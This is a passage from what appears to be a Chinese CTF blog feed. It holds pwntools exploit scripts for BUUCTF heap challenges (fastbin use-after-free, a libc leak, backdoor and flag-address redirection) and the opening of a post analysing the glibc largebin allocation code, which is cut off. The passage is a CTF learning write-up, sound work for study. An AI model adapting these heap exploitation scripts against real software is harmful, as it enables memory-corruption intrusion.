class="hljs-number">0x10a38c</span>]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :p.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br>it      = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>    <span class="hljs-comment"># log.success(&#x27;free addr: 0x%x&#x27; % free_addr)</span><br>    <span class="hljs-comment"># print &quot;pid&quot; + str(proc.pidof(p))</span><br>    log.success(<span class="hljs-string">&#x27;pid:%s&#x27;</span> % <span class="hljs-built_in">str</span>(proc.pidof(p)))<br>    raw_input(<span class="hljs-string">&#x27;&gt;&gt;&gt;&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>, number</span>):</span><br>    ru(<span class="hljs-string">&#x27;which command?\n&gt; &#x27;</span>)<br>    sl(<span class="hljs-number">1</span>)<br>    ru(<span class="hljs-string">&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>)<br>    sl(<span class="hljs-built_in">type</span>)<br>    ru(<span class="hljs-string">&#x27;number:&#x27;</span>)<br>    sl(number)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params"><span class="hljs-built_in">type</span></span>):</span><br>    ru(<span class="hljs-string">&#x27;which command?\n&gt; &#x27;</span>)<br>    sl(<span class="hljs-number">2</span>)<br>    ru(<span class="hljs-string">&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>)<br>    sl(<span class="hljs-built_in">type</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params"><span class="hljs-built_in">type</span></span>):</span><br>    ru(<span class="hljs-string">&#x27;which command?\n&gt; &#x27;</span>)<br>    sl(<span class="hljs-number">3</span>)<br>    ru(<span class="hljs-string">&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>)<br>    sl(<span class="hljs-built_in">type</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    <span class="hljs-comment"># 可泄露低4字节</span><br>    new(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>) <span class="hljs-comment"># 0 1</span><br>    delete(<span class="hljs-number">1</span>) <span class="hljs-comment"># 0，0 </span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>): <span class="hljs-comment"># 1-4 1</span><br>        new(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>)<br>    delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#  4 0</span><br>    new(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>) <span class="hljs-comment"># 0 1</span><br>    delete(<span class="hljs-number">2</span>) <span class="hljs-comment"># 4 0</span><br><br>    show(<span class="hljs-number">2</span>)<br>    ru(<span class="hljs-string">&#x27;:&#x27;</span>)<br>    leak = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>))<br>    <span class="hljs-keyword">if</span> leak &lt;<span class="hljs-number">0</span>:<br>        leak += <span class="hljs-number">0x10000</span><br>    <br>    log.info(<span class="hljs-built_in">hex</span>(leak))<br>    chunk0_addr = leak -<span class="hljs-number">0xa0</span><br>    log.info(<span class="hljs-built_in">hex</span>(chunk0_addr))<br>    <span class="hljs-comment"># new(2, p16(chunk0_addr))</span><br><br>    chunk0_addr = <span class="hljs-built_in">int</span>(chunk0_addr)<br>    <span class="hljs-comment"># 传入的是int型</span><br>    new(<span class="hljs-number">2</span>, chunk0_addr) <span class="hljs-comment"># 4 1</span><br>    new(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>) <span class="hljs-comment"># 5 1</span><br>    new(<span class="hljs-number">2</span>, <span class="hljs-number">0x30</span>+<span class="hljs-number">0x20</span>*<span class="hljs-number">3</span>+<span class="hljs-number">1</span>) <span class="hljs-comment"># 6</span><br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete(<span class="hljs-number">1</span>)<br>        new(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)<br><br>    delete(<span class="hljs-number">1</span>) <span class="hljs-comment"># 将chunk0释放进unsorted bin</span><br>    show(<span class="hljs-number">1</span>)<br>    ru(<span class="hljs-string">&#x27;:&#x27;</span>)<br>    main_arena = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>)) - <span class="hljs-number">96</span><br>    <span class="hljs-keyword">if</span> main_arena &lt; <span class="hljs-number">0</span>:<br>        main_arena += <span class="hljs-number">0x100000000</span><br>    log.info(<span class="hljs-built_in">hex</span>(main_arena))<br><br>    libc_base = main_arena - <span class="hljs-number">0x10</span> - libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] libc base&quot;</span>,<span class="hljs-built_in">hex</span>(libc_base)<br><br>    _IO_2_1_stdin_ = libc_base + libc.symbols[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="hljs-number">0x70</span> <span class="hljs-comment"># _fileno的地址</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] _fileno:&quot;</span>,<span class="hljs-built_in">hex</span>(_IO_2_1_stdin_)<br><br>    new(<span class="hljs-number">1</span>,<span class="hljs-built_in">int</span>(_IO_2_1_stdin_))<br>    new(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>)<br><br>    delete(<span class="hljs-number">1</span>)<br><br>    new(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>)<br>    delete(<span class="hljs-number">1</span>)<br><br>    show(<span class="hljs-number">1</span>)<br>    ru(<span class="hljs-string">&#x27;:&#x27;</span>)<br>    chunk0_addr = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>)) - <span class="hljs-number">0x30</span><br><br>    <span class="hljs-keyword">if</span> chunk0_addr &lt; <span class="hljs-number">0</span>:<br>        chunk0_addr += <span class="hljs-number">0x100000000</span><br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] chunk0&quot;</span>,<span class="hljs-built_in">hex</span>(chunk0_addr)<br>    <br>    new(<span class="hljs-number">1</span>,<span class="hljs-built_in">int</span>(chunk0_addr))<br>    new(<span class="hljs-number">1</span>,<span class="hljs-built_in">int</span>(chunk0_addr))<br>    new(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>    new(<span class="hljs-number">1</span>, <span class="hljs-number">666</span>)<br><br>    ru(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    sl(<span class="hljs-number">4</span>)<br>    it()<br><br>    debug()<br><br>exp()<br></code></pre></div></td></tr></table></figure><h2 id="gyctf-2020-some-thing-exceting"><a href="#gyctf-2020-some-thing-exceting" class="headerlink" title="gyctf_2020_some_thing_exceting"></a>gyctf_2020_some_thing_exceting</h2><p>fastbin uaf</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;REMOTE&#x27;</span>]:<br>    p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25287</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./gyctf_2020_some_thing_exceting&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./gyctf_2020_some_thing_exceting&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)<br><br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :p.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br>it      = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>    <span class="hljs-comment"># log.success(&#x27;free addr: 0x%x&#x27; % free_addr)</span><br>    <span class="hljs-comment"># print &quot;pid&quot; + str(proc.pidof(p))</span><br>    log.success(<span class="hljs-string">&#x27;pid:%s&#x27;</span> % <span class="hljs-built_in">str</span>(proc.pidof(p)))<br>    raw_input(<span class="hljs-string">&#x27;&gt;&gt;&gt;&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span>(<span class="hljs-params">ba_len, ba_content, na_len, na_content</span>):</span><br>    ru(<span class="hljs-string">&#x27; :&#x27;</span>)<br>    sl(<span class="hljs-number">1</span>)<br>    ru(<span class="hljs-string">&#x27; : &#x27;</span>)<br>    sl(ba_len)<br>    ru(<span class="hljs-string">&#x27; : &#x27;</span>)<br>    s(ba_content)<br>    ru(<span class="hljs-string">&#x27; : &#x27;</span>)<br>    sl(na_len)<br>    ru(<span class="hljs-string">&#x27; : &#x27;</span>)<br>    s(na_content)    <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modify</span>():</span><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>    ru(<span class="hljs-string">&#x27; :&#x27;</span>)<br>    sl(<span class="hljs-number">3</span>)<br>    ru(<span class="hljs-string">&#x27; : &#x27;</span>)<br>    sl(idx)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view</span>(<span class="hljs-params">idx</span>):</span><br>    ru(<span class="hljs-string">&#x27; :&#x27;</span>)<br>    sl(<span class="hljs-number">4</span>)<br>    ru(<span class="hljs-string">&#x27;&gt; SCP project ID : &#x27;</span>)<br>    sl(idx)<br>    ru(<span class="hljs-string">&quot;Banana&#x27;s ba is &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    flag = <span class="hljs-number">0x00000000006020A8</span><br>    create(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>    create(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">8</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">8</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># debug()</span><br>    create(<span class="hljs-number">0x10</span>,p64(flag),<span class="hljs-number">0x10</span>,p64(flag))<br>    debug()<br>    view(<span class="hljs-number">0</span>)<br>    it()<br>    debug()<br><br>exp()<br></code></pre></div></td></tr></table></figure><h2 id="bjdctf-2020-YDSneedGrirlfriend"><a href="#bjdctf-2020-YDSneedGrirlfriend" class="headerlink" title="bjdctf_2020_YDSneedGrirlfriend"></a>bjdctf_2020_YDSneedGrirlfriend</h2><p>fastbin uaf</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;REMOTE&#x27;</span>]:<br>    p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27803</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./bjdctf_2020_YDSneedGrirlfriend&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./bjdctf_2020_YDSneedGrirlfriend&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)<br>backdoor = <span class="hljs-number">0x0000000000400B9C</span><br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :p.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br>it      = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>    log.success(<span class="hljs-string">&#x27;pid:%s&#x27;</span> % <span class="hljs-built_in">str</span>(proc.pidof(p)))<br>    raw_input(<span class="hljs-string">&#x27;&gt;&gt;&gt;&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size, content</span>):</span><br>    ru(<span class="hljs-string">&#x27;choice :&#x27;</span>)<br>    sl(<span class="hljs-number">1</span>)<br>    ru(<span class="hljs-string">&#x27;is :&#x27;</span>)<br>    sl(size)<br>    ru(<span class="hljs-string">&#x27;is :&#x27;</span>)<br>    s(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>    ru(<span class="hljs-string">&#x27;choice :&#x27;</span>)<br>    sl(<span class="hljs-number">2</span>)<br>    ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>    sl(idx)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    ru(<span class="hljs-string">&#x27;choice :&#x27;</span>)<br>    sl(<span class="hljs-number">3</span>)<br>    ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>    sl(idx)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">fastbin uaf跟前一题做法一模一样</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>) <span class="hljs-comment"># 0</span><br>    add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>) <span class="hljs-comment"># 1</span><br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br><br>    add(<span class="hljs-number">0x10</span>,p64(backdoor))<br>    show(<span class="hljs-number">0</span>)<br>    it()<br><br>exp()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>BUUCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Largebin attack学习</title>
    <link href="/2021/03/28/Largebin%20attack%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/03/28/Largebin%20attack%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Largebin分配流程概述"><a href="#Largebin分配流程概述" class="headerlink" title="Largebin分配流程概述"></a>Largebin分配流程概述</h1><ul><li>在一个chunk被插入unsorted bin后，当我们再去申请chunk时，会反向遍历unsorted bin的双向循环链表，如果没有匹配到合适的大小，则会将根据bin的大小，将其放置到对应的large bin或small bin</li><li>如果所需分配的chunk为largebin chunk，则会反向遍历largebin链表</li><li>找到第一个大于等于所需chunk大小的chunk退出循环</li><li>将其切分后判断其剩余大小，如果大于MINSIZE，则构成新的chunk放入unsorted bin中</li><li>largebin链表中chunk按从大到小排列</li></ul><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="宏bin-at"><a href="#宏bin-at" class="headerlink" title="宏bin_at"></a>宏bin_at</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> bin_at(m, i) \</span><br>  (mbinptr) (((<span class="hljs-keyword">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="hljs-number">1</span>) * <span class="hljs-number">2</span>]))      \<br>             - offsetof (struct malloc_chunk, fd))<br></code></pre></div></td></tr></table></figure><p>宏bin_at(m,i)通过bin index获得bin的链表头</p><h2 id="largebin取出操作"><a href="#largebin取出操作" class="headerlink" title="largebin取出操作"></a>largebin取出操作</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment">         If a large request, scan through the chunks of current bin in</span><br><span class="hljs-comment">         sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="hljs-comment">       */</span><br><br>      <span class="hljs-keyword">if</span> (!in_smallbin_range (nb))<br>        &#123;<br>          bin = bin_at (av, idx);<br><br>          <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>          <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<br>              (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb))<br>            &#123;<span class="hljs-comment">//如果large bin链表为空或者其中最大的chunk也无法满足要求，则不能从large bin中分配</span><br>              victim = victim-&gt;bk_nextsize;<br>              <span class="hljs-keyword">while</span> (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size = chunksize (victim)) &lt;<br>                      (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb)))<br>                victim = victim-&gt;bk_nextsize;<span class="hljs-comment">//此时victim的大小大于我们所需chunk，反向遍历链表，直到找到第一个大于等于所需chunk大小的chunk退出循环</span><br><br>              <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip</span><br><span class="hljs-comment">                 list does not have to be rerouted.  */</span><br>              <span class="hljs-comment">//如果选取的chunk victim不是链表中的最后一个chunk，并且与victim大小相同的chunk不止一个，则申请此时堆头chunk的下一个</span><br>              <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)<br>                victim = victim-&gt;fd;<br><br>              remainder_size = size - nb;<span class="hljs-comment">//将victim进行切割</span><br>              unlink (av, victim, bck, fwd);<span class="hljs-comment">//调用unlink()宏将victim从large bin中取出</span><br><br>              <span class="hljs-comment">/* Exhaust */</span><br>              <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>                &#123;<span class="hljs-comment">//如果victim切分后剩余大小小于MINSIZE，则将整个victim分配给应用层，这种情况下，实际分配的chunk比所需的chunk大一些</span><br>                  set_inuse_bit_at_offset (victim, size);<br>                  <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                    victim-&gt;size |= NON_MAIN_ARENA;<br>                &#125;<br>              <span class="hljs-comment">/* Split */</span><br>              <span class="hljs-keyword">else</span><br>                &#123;<span class="hljs-comment">//如果剩余空间还可以构成chunk，则将其放入unsorted bin</span><br>                  remainder = chunk_at_offset (victim, nb);<br>                  <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                     have to perform a complete insert here.  */</span><br>                  bck = unsorted_chunks (av);<br>                  fwd = bck-&gt;fd; <span class="hljs-comment">//fwd是unsorted bin第一个chunk</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                    &#123;<br>                      errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                      <span class="hljs-keyword">goto</span> errout;<br>                    &#125;<br>                  remainder-&gt;bk = bck;<br>                  remainder-&gt;fd = fwd;<br>                  bck-&gt;fd = remainder;<br>                  fwd-&gt;bk = remainder;<br>                  <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                    &#123;<br>                      remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                      remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br>                  set_head (victim, nb | PREV_INUSE |<br>                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                  set_head (remainder, remainder_size | PREV_INUSE);<br>                  set_foot (remainder, remainder_size);<br>                &#125;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-keyword">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br></code></pre></div></td></tr></table></figure><h2 id="largebin插入操作"><a href="#largebin插入操作" class="headerlink" title="largebin插入操作"></a>largebin插入操作</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 